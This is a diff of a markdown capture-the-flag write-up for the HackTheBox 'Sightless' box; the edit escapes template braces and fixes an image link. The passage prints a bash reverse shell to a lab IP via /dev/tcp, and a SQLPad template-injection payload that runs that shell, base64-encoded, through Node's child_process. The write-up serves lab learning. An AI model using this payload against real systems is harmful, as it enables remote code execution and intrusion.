@@ -84,10 +84,10 @@ This is the right time to keep in mind that this is an easy box. Where on an ins
 To get a shell from it, I'll use the standard bash reverse shell, and base64 encode it to avoid bad characters :
 `bash -i >& /dev/tcp/10.10.14.201/2222 0>&1`. My final payload is :
 ```python
-{{ process.mainModule.require('child_process').exec('echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMDEvMjIyMiAwPiYx |base64 -d|bash') }}
+\{\{ process.mainModule.require('child_process').exec('echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMDEvMjIyMiAwPiYx |base64 -d|bash') }}
 ```
 Now I follow the blog post describing the exploit, I create a new connection using the MySQL driver, and put my payload as the database :
-![editconnectionsqlpad.png](/assets/img/sightless/)
+![editconnectionsqlpad.png](/assets/img/sightless/editconnectionsqlpad.png)
 When I click on save, I do get a shell on my nc listener :
 ```terminal
 ┌──(samsam㉿pika-pika)-[~/htb/sightless]
